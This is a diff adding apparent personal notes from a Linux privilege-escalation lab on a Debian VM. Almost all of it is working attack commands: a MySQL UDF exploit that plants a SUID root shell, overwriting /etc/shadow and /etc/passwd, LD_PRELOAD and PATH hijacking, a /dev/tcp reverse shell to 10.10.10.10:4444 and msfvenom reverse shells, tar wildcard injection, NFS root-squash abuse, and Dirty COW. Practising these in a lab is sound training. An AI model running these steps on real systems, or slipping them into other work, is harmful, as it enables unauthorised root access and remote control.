@@ -1,1 +1,159 @@
 
+ ## Service Exploits
+1. MySQL User Defined Functions to run Exploit raptor_udf2.c 
+- Compiling exploit
+gcc -g -c raptor_udf2.c -fPIC
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+2. Connected to MySQL and creating the do_system User Defined Function.
+- use mysql;
+create table foo(line blob);
+insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
+select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+create function do_system returns integer soname 'raptor_udf2.so';
+
+select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
+
+/tmp/rootbash -p
+rm /tmp/rootbash
+exit
+
+
+## Weak File Permissions Readable /etc/shadow
+1. Saved root users password hash and decrpyted using John the Ripper
+- john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+
+## Weak File Permissions Writeable /etc/shadow
+1. Created new password hash for root user
+- mkpasswd -m sha-512 newpasswordhere
+2. Changed Root hash to new hash
+
+## Weak File Permissions Writable /etc/passwd
+1. Generated new password ssh hash 
+- openssl passwd newpasswordhere
+2. Edited vim /etc/passwd inputted new password for root
+3. Signed in as new root.
+
+
+## Sudo Environment Variables
+1. Created a shared object using the code located at /home/user/tools/sudo/preload.c:
+- gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
+2. Ran vim with the new obejct name 
+- sudo LD_PRELOAD=/tmp/preload.so vim
+3. Created a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library_path.c:
+- gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
+4. Ram apache2 using sudo, while settings the LD_LIBRARY_PATH environment variable to /tmp (where we output the compiled shared object):
+sudo LD_LIBRARY_PATH=/tmp apache2
+Gained root access.
+
+## Cron Jobs - File Permissions
+1. Located overwrite.sh to establish new Cron job
+- #!/bin/bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
+2. Used netcat to listen in on any connections
+
+## Cron Jobs - PATH Environment Variable
+1. Created another overwrite.sh file
+- chmod +x /home/user/overwrite.sh made it an exec
+2. Began the cronjob,
+- /tmp/rootbash -p
+-rm /tmp/rootbash
+exit
+Gained the file path.
+
+## Cron Jobs - Wildcards
+1. Used msfvenom to create reverse shell.
+- msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.132.121 LPORT=4444 -f elf -o shell.elf
+- chmod +x /home/user/shell.elf ensuring its an exec
+2. Created two files in /home/usr
+- touch /home/user/--checkpoint=1
+- touch /home/user/--checkpoint-action=exec=shell.elf
+3. Run a netcat listener to watch job run.
+
+## SUID / SGID Executables - Known Exploits
+1. Find SUID executable via exploit DB.
+- find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+- /home/user/tools/suid/exim/cve-2016-1531.sh
+
+## SUID / SGID Executables - Shared Object Injection
+1. /usr/local/bin/suid-so SUID executable is vulnerable
+- /usr/local/bin/suid-so
+2. Ran Strace
+- strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
+3. create .config directory
+- mkdir /home/user/.config
+-gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
+-/usr/local/bin/suid-so
+Gained root shell.
+
+## SUID / SGID Executables - Environment Variables
+1. /usr/local/bin/suid-env executable can be exploited
+- /usr/local/bin/suid-env
+- gcc -o service /home/user/tools/suid/service.c
+- PATH=.:$PATH /usr/local/bin/suid-env
+
+## SUID / SGID Executables - Abusing Shell Features (#1)
+1. Verify  /usr/local/bin/suid-env2 with strings command.
+-  /usr/local/bin/suid-env2
+- /bin/bash --version
+2. Create bash function 
+- function /usr/sbin/service { /bin/bash -p; }
+export -f /usr/sbin/service
+3. /usr/local/bin/suid-env2
+Gained root shell.
+
+## SUID / SGID Executables - Abusing Shell Features (#2)
+1. Ran exploit with bash debugging.
+- env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
+- /tmp/rootbash -p
+- rm /tmp/rootbash
+
+## Passwords & Keys - History Files
+1. Viewed hidden password history file.
+- cat ~/.*history | less
+2. Swapped to root 
+- su root
+
+## Passwords & Keys - Config Files
+1. Located myvpn.ovpn file
+- cat /home/user/myvpn.ovpn
+2. Logged into root to find user credentials
+
+## Passwords & Keys - SSH Keys
+1. Looked for hidden files and directories
+- ls -la /
+2. Found .ssh file and private ssh key
+- chmod 600 root_key
+3. Used key to log in to Debian VM
+- ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@10.10.132.121
+
+## NFS
+1. Checked NFS share file directory
+- cat /etc/exports
+2. Swapped to Root user
+- mkdir /tmp/nfs
+- mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs
+3. Generate payload via msfvenom saved to the mounted share.
+- msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
+- chmod +xs /tmp/nfs/shell.elf
+5. Gained root access on Debian Vm
+-/tmp/shell.elf
+
+## Kernel Exploits
+1. Ran Linux Kernel Exploits 2 Tool on debian VM
+- perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
+2. Exploited DIRTY COW Code
+- gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w ./c0w
+3. Used /usr/bin/passwd to gain root access
+- mv /tmp/bak /usr/bin/passwd
+exit
+
+
+
+
+
+
+
+
+
+
+
+
